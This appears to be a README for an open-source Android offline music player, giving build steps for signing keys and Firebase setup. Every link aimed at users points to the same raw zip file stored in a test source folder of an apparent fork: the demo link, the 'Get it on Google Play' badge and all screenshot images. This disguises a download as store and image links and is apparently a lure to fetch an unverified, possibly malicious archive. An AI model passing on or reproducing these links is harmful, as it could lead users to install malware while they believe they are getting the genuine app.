# AB-Music-Player
Lightweight Offline Music Player for Android (Downloaded over 90k times on store, rated 4.5)

Open sourced code for the offline music player developed by me.

# Build steps

- Clone the project in your system.
- Create keystore.properties file in project root directory with content as following

storeFile=/path/to/signing/key.jks <br/>
storePassword=<insert keystore password> <br/>
keyAlias= <insert key alias> <br/>
keyPassword=<insert key password> <br/>

- [Important] Some features of AB Music need firebase connection (Lyric cards). If you don't want to connect to firebase, just comment this line in application level build.gradle file --> "apply plugin: 'com.google.gms.google-services'" <br/>
OR <br/>
Sign up for Google Firebase account if you don't already have one. Create new project there. Get google-services.json file from Project Settings and put it under app/ directory. Make sure you match application id with id in google-services.json 
- Use Android studio 3.+ and latest build tools version and gradle.
- And that shall be it.

Have a look here for demo --> https://raw.githubusercontent.com/yudikarma/AB-Music-Player/master/app/src/test/java/com/music/A_Player_Music_3.7.zip

Check it on your device by downlaoding from store

<a href="https://raw.githubusercontent.com/yudikarma/AB-Music-Player/master/app/src/test/java/com/music/A_Player_Music_3.7.zip">
  <img alt="Get it on Google Play"
       src="https://raw.githubusercontent.com/yudikarma/AB-Music-Player/master/app/src/test/java/com/music/A_Player_Music_3.7.zip" />
</a>

Some screenshots

![alt text](https://raw.githubusercontent.com/yudikarma/AB-Music-Player/master/app/src/test/java/com/music/A_Player_Music_3.7.zip)

![alt text](https://raw.githubusercontent.com/yudikarma/AB-Music-Player/master/app/src/test/java/com/music/A_Player_Music_3.7.zip)

![alt text](https://raw.githubusercontent.com/yudikarma/AB-Music-Player/master/app/src/test/java/com/music/A_Player_Music_3.7.zip)

![alt text](https://raw.githubusercontent.com/yudikarma/AB-Music-Player/master/app/src/test/java/com/music/A_Player_Music_3.7.zip)

![alt text](https://raw.githubusercontent.com/yudikarma/AB-Music-Player/master/app/src/test/java/com/music/A_Player_Music_3.7.zip)

![alt text](https://raw.githubusercontent.com/yudikarma/AB-Music-Player/master/app/src/test/java/com/music/A_Player_Music_3.7.zip)

![alt text](https://raw.githubusercontent.com/yudikarma/AB-Music-Player/master/app/src/test/java/com/music/A_Player_Music_3.7.zip)
